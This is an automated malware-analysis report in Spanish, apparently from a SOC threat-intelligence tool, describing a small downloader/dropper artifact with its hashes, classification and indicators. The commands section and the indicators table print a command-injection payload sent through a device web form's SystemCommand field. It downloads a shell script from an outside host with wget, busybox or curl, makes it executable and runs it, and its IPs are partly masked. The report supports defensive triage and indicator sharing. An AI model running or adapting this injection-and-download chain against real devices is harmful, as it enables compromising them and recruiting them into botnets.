# 🧬 Payload Analysis

`d8dcdc24e4be5048fe2e84a1238b9d8ea089f3ec56dfeddac051261250f51d9f`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `d8dcdc24e4be5048fe2e84a1238b9d8ea089f3ec56dfeddac051261250f51d9f`
- **SHA1:** `3a744c2b30288c48580e4fcf8ef9a577163b0a53`
- **MD5:** `d9595da1e573d5c598c67abf1b3c5c46`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (324), with no line terminators |
| Tamaño | 324 B |
| Entropía | 4.98 |
| Strings | 1 |

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (324), with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
ReplySuccessPage=docmd.htm&ReplyErrorPage=docmd.htm&SystemCommand=cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 91.92.40.XXX | static_analysis |
| url | hxxp://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bcurl%20-o%20.s%20http://91.92.40.XXX/wget.sh%3Bchmod%20777%20.s%3Bsh%20.s%20rep.dsyscmd%3Brm%20-f%20.s&ConfigSystemCommand=Save | strings |
| hash | d8dcdc24e4be5048fe2e84a1238b9d8ea089f3ec56dfeddac051261250f51d9f | static_analysis |
| command | ReplySuccessPage=docmd.htm&ReplyErrorPage=docmd.htm&SystemCommand=cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92.40.XXX/ | strings |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
